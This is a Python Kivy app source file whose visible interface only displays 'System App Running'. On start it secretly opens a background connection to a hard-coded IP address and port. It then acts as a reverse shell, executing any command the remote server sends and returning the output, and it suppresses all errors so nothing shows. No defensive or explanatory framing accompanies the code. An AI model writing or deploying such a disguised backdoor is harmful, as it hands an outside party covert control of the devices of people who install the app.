import socket
import subprocess
import os
import threading
from kivy.app import App
from kivy.uix.label import Label

class RemoteApp(App):
    def build(self):
        return Label(text="System App Running")

    def on_start(self):
        threading.Thread(target=self.connect_to_server, daemon=True).start()

    def connect_to_server(self):
        SERVER_HOST = "100.81.254.12"
        SERVER_PORT = 5003
        BUFFER_SIZE = 131072

        try:
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            s.send(os.getcwd().encode())

            while True:
                command = s.recv(BUFFER_SIZE).decode()
                if not command or command.lower() == "exit":
                    break
                
                if command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        output = ""
                    except Exception as e:
                        output = str(e)
                else:
                    output = subprocess.getoutput(command)
                    
                message = f"{output}\n{os.getcwd()}"
                s.send(message.encode())
            s.close()
        except:
            pass

if __name__ == "__main__":
    RemoteApp().run()
